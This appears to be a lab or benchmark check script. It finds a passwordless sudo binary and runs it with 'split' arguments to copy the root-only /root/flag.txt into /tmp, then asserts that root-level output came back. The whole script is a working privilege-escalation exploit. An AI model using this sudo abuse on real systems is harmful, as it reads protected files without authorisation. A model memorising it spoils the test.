#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}")
rm -f /tmp/bench_split_*
cd /tmp
sudo -n "$BIN" -l1 /root/flag.txt bench_split_
cat /tmp/bench_split_*
')"
assert_root_output "${out}" 
